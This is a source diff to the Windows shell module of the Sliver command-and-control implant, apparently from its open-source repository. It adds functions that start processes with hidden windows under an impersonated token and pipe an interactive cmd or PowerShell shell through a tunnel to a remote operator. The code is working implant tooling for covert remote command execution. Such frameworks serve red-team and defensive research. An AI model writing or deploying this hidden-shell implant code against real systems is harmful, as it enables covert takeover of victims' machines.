@@ -18,13 +18,23 @@ package shell
 	along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */
 
+import (
+	// {{if .Config.Debug}}
+	"log"
+	// {{end}}
+
+	"github.com/bishopfox/sliver/implant/sliver/priv"
+	"golang.org/x/sys/windows"
+	"os/exec"
+	"syscall"
+)
+
 var (
 	// Shell constants
 	commandPrompt = []string{"C:\\Windows\\System32\\cmd.exe"}
 	powerShell    = []string{
 		"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
 		"-NoExit",
-		// "-WindowStyle", "Hidden",
 		"-Command", "[Console]::OutputEncoding=[Text.UTF8Encoding]::UTF8",
 	}
 )
@@ -38,4 +48,41 @@ func GetSystemShellPath(path string) []string {
 		return powerShell
 	}
 	return commandPrompt
+}
+
+// Start - Start a process
+func Start(command string) error {
+	cmd := exec.Command(command)
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		Token:      syscall.Token(priv.CurrentToken),
+		HideWindow: true,
+	}
+	return cmd.Start()
+}
+
+// StartInteractive - Start a shell
+func StartInteractive(tunnelID uint64, command []string, _ bool) *Shell {
+	return pipedShell(tunnelID, command)
+}
+
+func pipedShell(tunnelID uint64, command []string) *Shell {
+	// {{if .Config.Debug}}
+	log.Printf("[shell] %s", command)
+	// {{end}}
+
+	var cmd *exec.Cmd
+	cmd = exec.Command(command[0], command[1:]...)
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		Token:      syscall.Token(priv.CurrentToken),
+		HideWindow: true,
+	}
+	stdin, _ := cmd.StdinPipe()
+	stdout, _ := cmd.StdoutPipe()
+
+	return &Shell{
+		ID:      tunnelID,
+		Command: cmd,
+		Stdout:  stdout,
+		Stdin:   stdin,
+	}
 }
